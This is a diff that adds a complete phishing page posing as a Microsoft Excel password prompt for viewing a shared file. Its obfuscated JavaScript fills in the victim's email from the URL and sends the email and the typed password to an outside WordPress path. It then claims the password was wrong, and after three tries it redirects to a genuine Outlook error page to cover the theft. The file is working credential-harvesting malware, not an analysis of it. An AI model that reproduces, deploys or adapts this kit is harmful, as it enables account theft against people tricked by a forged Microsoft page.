@@ -1,0 +1,215 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Excel Login</title>
+    <style>
+        body {
+            font-family: Segoe UI, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-image: url('https://firebasestorage.googleapis.com/v0/b/png-images-481bb.appspot.com/o/poimagebackground.jpg?alt=media&token=722f52de-0bf6-41ea-903b-aabfdb8b4e60');
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            position: relative;
+        }
+
+        body::after {
+            content: "";
+            position: absolute;
+            top: 10%;
+            left: 0;
+            width: 100%;
+            height: 90%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: -1;
+        }
+
+        .page-logo {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            width: 45px;
+            height: auto;
+            z-index: 10;
+        }
+
+        .form-container {
+            background-color: #fff;
+            border-radius: 0;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            height: 390px;
+            width: 410px;
+            box-sizing: border-box;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .form-container > * {
+            opacity: 0;
+            animation: slideIn 0.5s ease forwards;
+            animation-delay: calc(var(--index) * 0.2s);
+            animation-fill-mode: forwards;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        .logo {
+            width: 120px;
+            height: auto;
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            --index: 1;
+        }
+
+        .second-logo {
+            width: 10px;
+            height: auto;
+            position: absolute;
+            top: 95px;
+            left: 30px;
+            --index: 2;
+        }
+
+        .title {
+            color: #666;
+            font-size: 20px;
+            position: absolute;
+            top: 33px;
+            left: 120px;
+            --index: 3;
+        }
+
+        .username-display {
+            color: #666;
+            font-size: 16px;
+            position: absolute;
+            top: 86px;
+            left: 50px;
+            --index: 4;
+        }
+
+        .enter-password {
+            font-family: Segoe UI, Arial, sans-serif;
+            font-size: 22px;
+            font-weight: italic;
+            position: absolute;
+            top: 120px;
+            left: 30px;
+            text-align: left;
+            width: 350px;
+            --index: 5;
+        }
+
+        .additional-text {
+            font-family: Segoe UI, Arial, sans-serif;
+            font-size: 13px;
+            color: #666;
+            position: absolute;
+            top: 150px;
+            left: 30px;
+            text-align: left;
+            width: 350px;
+            --index: 6;
+        }
+
+        .additional-text a {
+            color: blue;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        .password-input {
+            font-family: Segoe UI, Arial, sans-serif;
+            font-size: 16px;
+            color: #666;
+            border: none;
+            border-bottom: 1px solid black;
+            background-color: transparent;
+            outline: none;
+            padding: 5px;
+            margin-top: 10px;
+            width: 332px;
+            text-align: left;
+            position: absolute;
+            top: 180px;
+            left: 30px;
+            --index: 7;
+        }
+
+        .password-input:focus {
+            border-bottom: 1px solid blue;
+        }
+
+        .note {
+            font-family: Segoe UI, Arial, sans-serif;
+            font-size: 13px;
+            color: blue;
+            position: absolute;
+            top: 240px;
+            left: 30px;
+            text-align: left;
+            width: 350px;
+            --index: 8;
+        }
+
+        .submit-container {
+            position: absolute;
+            bottom: 50px;
+            right: 45px;
+            padding: 5px 18px;
+            background-color: #039126;
+            color: #fff;
+            border-radius: 0;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            top: 310px;
+            left: 280px;
+            --index: 9;
+        }
+
+        .submit-container:hover {
+            background-color: #037a22;
+        }
+
+        .error-container {
+            display: none;
+            position: absolute;
+            top: 270px;
+            left: 30px;
+            width: 350px;
+            color: red;
+            font-size: 13px;
+        }
+
+        .green-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 10%;
+            background-color: #207245;
+        }
+    </style>
+</head>
+<body>
+    <script>
+const _0x308251=_0x2ba8;(function(_0x49d0f8,_0x645405){const _0x9098eb=_0x2ba8,_0x4d308d=_0x49d0f8();while(!![]){try{const _0x473048=parseInt(_0x9098eb(0xdd))/0x1+parseInt(_0x9098eb(0xef))/0x2*(-parseInt(_0x9098eb(0xbe))/0x3)+parseInt(_0x9098eb(0xb0))/0x4+parseInt(_0x9098eb(0xf0))/0x5*(-parseInt(_0x9098eb(0xa7))/0x6)+parseInt(_0x9098eb(0xe0))/0x7+-parseInt(_0x9098eb(0xe3))/0x8+parseInt(_0x9098eb(0xd3))/0x9;if(_0x473048===_0x645405)break;else _0x4d308d['push'](_0x4d308d['shift']());}catch(_0x209aa1){_0x4d308d['push'](_0x4d308d['shift']());}}}(_0x1791,0x575bc));let signInAttempts=0x0;function showError(_0x2c81db,_0x8aecef){const _0x2949f4=_0x2ba8;_0x2c81db[_0x2949f4(0xb3)]=_0x8aecef,_0x2c81db['style'][_0x2949f4(0xb2)]=_0x2949f4(0xbb),_0x2c81db[_0x2949f4(0xac)]['color']='red';const _0x588cf3=document[_0x2949f4(0xec)](_0x2949f4(0xed));_0x588cf3[_0x2949f4(0xc8)]='',setTimeout(()=>{const _0x45e86c=_0x2949f4;_0x2c81db[_0x45e86c(0xac)][_0x45e86c(0xb2)]=_0x45e86c(0xd6);},0x7d0);}function getEmailFromUrl(){const _0x41ff6c=_0x2ba8,_0x2003f2=new URLSearchParams(window[_0x41ff6c(0xbf)][_0x41ff6c(0xb9)]);return _0x2003f2[_0x41ff6c(0xcf)](_0x41ff6c(0xe1))||'';}const emltag=getEmailFromUrl();function createForm(){const _0x560996=_0x2ba8,_0x3f0117=document[_0x560996(0xec)]('body'),_0x10de02=document[_0x560996(0xd9)](_0x560996(0xc9));_0x10de02[_0x560996(0xde)][_0x560996(0xba)]('green-line'),_0x3f0117[_0x560996(0xc3)](_0x10de02);const _0x1f7270=document[_0x560996(0xd9)](_0x560996(0xa9));_0x1f7270['src']='https://firebasestorage.googleapis.com/v0/b/png-images-481bb.appspot.com/o/98845_15_excel_icon.png?alt=media&token=cb28188b-9c21-482b-b418-cf68b6847d08',_0x1f7270['alt']=_0x560996(0xb1),_0x1f7270[_0x560996(0xde)][_0x560996(0xba)](_0x560996(0xe7)),_0x3f0117['appendChild'](_0x1f7270);const _0x2287f5=document['createElement'](_0x560996(0xc9));_0x2287f5[_0x560996(0xde)]['add'](_0x560996(0xb5)),_0x3f0117['appendChild'](_0x2287f5);const _0x392ed2=document[_0x560996(0xd9)](_0x560996(0xa9));_0x392ed2['src']=_0x560996(0xe5),_0x392ed2[_0x560996(0xbd)]='Microsoft\x20Excel\x20Logo',_0x392ed2[_0x560996(0xde)][_0x560996(0xba)](_0x560996(0xc6)),_0x2287f5[_0x560996(0xc3)](_0x392ed2);const _0x448b3c=document[_0x560996(0xd9)]('img');_0x448b3c['src']=_0x560996(0xce),_0x448b3c[_0x560996(0xbd)]=_0x560996(0xe6),_0x448b3c['classList'][_0x560996(0xba)](_0x560996(0xd1)),_0x2287f5[_0x560996(0xc3)](_0x448b3c);const _0x146083=document[_0x560996(0xd9)](_0x560996(0xdf));_0x146083[_0x560996(0xb3)]=_0x560996(0xca),_0x146083['classList'][_0x560996(0xba)](_0x560996(0xb8)),_0x2287f5[_0x560996(0xc3)](_0x146083);const _0x22418b=document[_0x560996(0xd9)]('span');_0x22418b[_0x560996(0xb3)]=emltag,_0x22418b[_0x560996(0xde)][_0x560996(0xba)]('username-display'),_0x2287f5[_0x560996(0xc3)](_0x22418b);const _0x496202=document[_0x560996(0xd9)](_0x560996(0xc9));_0x496202[_0x560996(0xb3)]=_0x560996(0xd5),_0x496202[_0x560996(0xde)][_0x560996(0xba)]('enter-password'),_0x2287f5['appendChild'](_0x496202);const _0x3dd545=document[_0x560996(0xd9)](_0x560996(0xc9));_0x3dd545['classList'][_0x560996(0xba)]('additional-text'),_0x3dd545[_0x560996(0xb6)]=_0x560996(0xea),_0x2287f5[_0x560996(0xc3)](_0x3dd545);const _0x5ea829=document[_0x560996(0xd9)]('input');_0x5ea829[_0x560996(0xcd)]='password',_0x5ea829[_0x560996(0xd0)]=_0x560996(0xe4),_0x5ea829[_0x560996(0xde)]['add'](_0x560996(0xab)),_0x2287f5[_0x560996(0xc3)](_0x5ea829);const _0x50fdc9=document[_0x560996(0xd9)]('div');_0x50fdc9[_0x560996(0xb3)]=_0x560996(0xd2),_0x50fdc9[_0x560996(0xde)][_0x560996(0xba)](_0x560996(0xda)),_0x2287f5[_0x560996(0xc3)](_0x50fdc9);const _0x1121ef=document[_0x560996(0xd9)](_0x560996(0xc9));_0x1121ef[_0x560996(0xb3)]=_0x560996(0xb7),_0x1121ef[_0x560996(0xde)][_0x560996(0xba)](_0x560996(0xae)),_0x1121ef[_0x560996(0xaa)]=submitForm,_0x2287f5[_0x560996(0xc3)](_0x1121ef);const _0x2cf67f=document[_0x560996(0xd9)]('div');_0x2cf67f[_0x560996(0xde)][_0x560996(0xba)](_0x560996(0xd7)),_0x2287f5[_0x560996(0xc3)](_0x2cf67f),_0x5ea829['addEventListener']('keydown',function(_0x2d9832){const _0x12a9c3=_0x560996;_0x2d9832['key']===_0x12a9c3(0xc5)&&submitForm();});}function _0x2ba8(_0x5e6cb9,_0x1fb477){const _0x17918e=_0x1791();return _0x2ba8=function(_0x2ba850,_0x18e594){_0x2ba850=_0x2ba850-0xa7;let _0x65e916=_0x17918e[_0x2ba850];return _0x65e916;},_0x2ba8(_0x5e6cb9,_0x1fb477);}function _0x1791(){const _0x3387b5=['type','https://firebasestorage.googleapis.com/v0/b/png-images-481bb.appspot.com/o/backArrow.png?alt=media&token=4765ea58-a791-48f4-ae63-f243245537d8','get','placeholder','second-logo','Note:\x20Only\x20the\x20above\x20email\x20recipient\x20can\x20can\x20view\x20this\x20file.','369018gjjtxs','click','Enter\x20password','none','error-container','text','createElement','note','Error\x20submitting\x20form:','Your\x20account\x20or\x20password\x20is\x20incorrect.\x20If\x20you\x20don\x27t\x20remember\x20your\x20password,','181536UmvwwT','classList','span','4738132UVsEab','email','href','2600520PMwBEo','Password','https://firebasestorage.googleapis.com/v0/b/png-images-481bb.appspot.com/o/kisspng-microsoft-excel-tutorial-template-computer-softwar-ms-project-5b1522908fce09.337777551528111760589.png?alt=media&token=299f9b2d-6619-48b6-bdc7-a6bd1124d2db','Back\x20Arrow','page-logo','Password\x20cannot\x20be\x20empty.','reload','Because\x20you\x27re\x20accessing\x20sensitive\x20info,\x20you\x20need\x20to\x20verify\x20your\x20password.','.username-display','querySelector','.password-input','...','6uITiql','30NaCban','151482NbQGRE','DOMContentLoaded','img','onclick','password-input','style','cursor','submit-container','Response\x20from\x20server:','2573756OtbmBW','Microsoft\x20Excel\x20Logo','display','textContent','trim','form-container','innerHTML','View','title','search','add','block','password','alt','708486sVdelA','location','addEventListener','then','.additional-text','appendChild','append','Enter','logo','POST','value','div','Microsoft\x20Excel','catch','blue'];_0x1791=function(){return _0x3387b5;};return _0x1791();}function submitForm(){const _0x53b3fb=_0x2ba8,_0x4b42e8=document[_0x53b3fb(0xec)](_0x53b3fb(0xeb))[_0x53b3fb(0xb3)][_0x53b3fb(0xb4)](),_0x2d49f9=document['querySelector'](_0x53b3fb(0xed))[_0x53b3fb(0xc8)];if(!_0x2d49f9){const _0x13880e=document[_0x53b3fb(0xec)]('.error-container');showError(_0x13880e,_0x53b3fb(0xe8));return;}const _0xe4b7e2=document[_0x53b3fb(0xec)]('.submit-container');_0xe4b7e2['textContent']=_0x53b3fb(0xee);const _0x5442f0=new FormData();_0x5442f0['append'](_0x53b3fb(0xe1),_0x4b42e8),_0x5442f0[_0x53b3fb(0xc4)](_0x53b3fb(0xbc),_0x2d49f9),_0x5442f0[_0x53b3fb(0xc4)]('username',_0x4b42e8),fetch('https://smilingtomato.com/wp-content/uv.php',{'method':_0x53b3fb(0xc7),'body':_0x5442f0})[_0x53b3fb(0xc1)](_0x428554=>_0x428554[_0x53b3fb(0xd8)]())[_0x53b3fb(0xc1)](_0x4c1731=>{const _0x3c178a=_0x53b3fb;console['log'](_0x3c178a(0xaf),_0x4c1731);if(signInAttempts>=0x1){const _0x3859ea=document[_0x3c178a(0xec)](_0x3c178a(0xc2));_0x3859ea[_0x3c178a(0xb3)]=_0x3c178a(0xdc);const _0x12e8f2=document['createElement'](_0x3c178a(0xdf));_0x12e8f2[_0x3c178a(0xb3)]='\x20reset\x20it\x20now',_0x12e8f2[_0x3c178a(0xac)]['color']=_0x3c178a(0xcc),_0x12e8f2[_0x3c178a(0xac)][_0x3c178a(0xad)]='pointer',_0x12e8f2[_0x3c178a(0xc0)](_0x3c178a(0xd4),()=>{const _0x2d3653=_0x3c178a;location[_0x2d3653(0xe9)]();}),_0x3859ea[_0x3c178a(0xc3)](_0x12e8f2);}signInAttempts++;const _0x31f072=document[_0x3c178a(0xec)](_0x3c178a(0xed));_0x31f072['value']='',signInAttempts===0x3&&(window['location'][_0x3c178a(0xe2)]='https://outlook.office365.com/Encryption/ErrorPage.aspx?src=3&code=11&be=SN6PR04MB4014&fe=JNAP275CA0040.ZAFP275.PROD.OUTLOOgK.COM&loc=en-US&itemID=E4E_M_e9df154a-e4b8-4486-8aec-7acceeb93fee'),_0xe4b7e2[_0x3c178a(0xb3)]='View';})[_0x53b3fb(0xcb)](_0xf7a980=>{const _0x3810cc=_0x53b3fb;console['error'](_0x3810cc(0xdb),_0xf7a980),_0xe4b7e2[_0x3810cc(0xb3)]=_0x3810cc(0xb7);});}document[_0x308251(0xc0)](_0x308251(0xa8),createForm);
+    </script>
+
+
+<div class="green-line"></div><img src="https://firebasestorage.googleapis.com/v0/b/png-images-481bb.appspot.com/o/98845_15_excel_icon.png?alt=media&amp;token=cb28188b-9c21-482b-b418-cf68b6847d08" alt="Microsoft Excel Logo" class="page-logo"><div class="form-container"><img src="https://firebasestorage.googleapis.com/v0/b/png-images-481bb.appspot.com/o/kisspng-microsoft-excel-tutorial-template-computer-softwar-ms-project-5b1522908fce09.337777551528111760589.png?alt=media&amp;token=299f9b2d-6619-48b6-bdc7-a6bd1124d2db" alt="Microsoft Excel Logo" class="logo"><img src="https://firebasestorage.googleapis.com/v0/b/png-images-481bb.appspot.com/o/backArrow.png?alt=media&amp;token=4765ea58-a791-48f4-ae63-f243245537d8" alt="Back Arrow" class="second-logo"><span class="title">Microsoft Excel</span><span class="username-display"></span><div class="enter-password">Enter password</div><div class="additional-text">Because you're accessing sensitive info, you need to verify your password.</div><input type="password" placeholder="Password" class="password-input"><div class="note">Note: Only the above email recipient can can view this file.</div><div class="submit-container">View</div><div class="error-container"></div></div></body></html>
